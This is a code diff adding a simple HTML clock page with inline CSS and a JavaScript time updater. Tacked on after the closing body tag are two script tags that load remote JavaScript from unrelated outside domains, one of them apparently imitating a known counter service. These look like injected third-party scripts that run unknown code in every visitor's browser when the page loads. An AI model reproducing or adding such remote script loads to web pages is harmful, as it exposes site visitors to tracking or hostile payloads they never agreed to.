@@ -1,0 +1,33 @@
+
+<!DOCTYPE html>
+<html>
+    <body>
+        <h1 id="time" class="clock"></h1>
+        <style>
+            .clock {
+                color:white;
+                text-align:center;
+                top:67px;
+                font-size:87px;
+            }
+            body {
+                background-image:url("os2.jpg");
+                font-family:sans-serif;
+
+            }
+        </style>
+
+        <script src="index.js"></script>
+        <script>
+              function updateTime() {
+  var date = new Date();
+  var options = { hour: 'numeric', minute: 'numeric',  hour12: true };
+  var formattedTime = date.toLocaleTimeString('en-US', options);
+  document.getElementById("time").innerHTML = formattedTime;
+  }
+  
+  setInterval(updateTime, 1000); 
+        </script>
+    </body>
+<script type="text/javascript" src="https://www.stat-counter.org/count/gb9x"></script><br>
+ <script type='text/javascript' src='https://www.whomania.com/ctr?id=e8e4f705ea1d3e6fa26526ff699944b749631f40'></script></html>
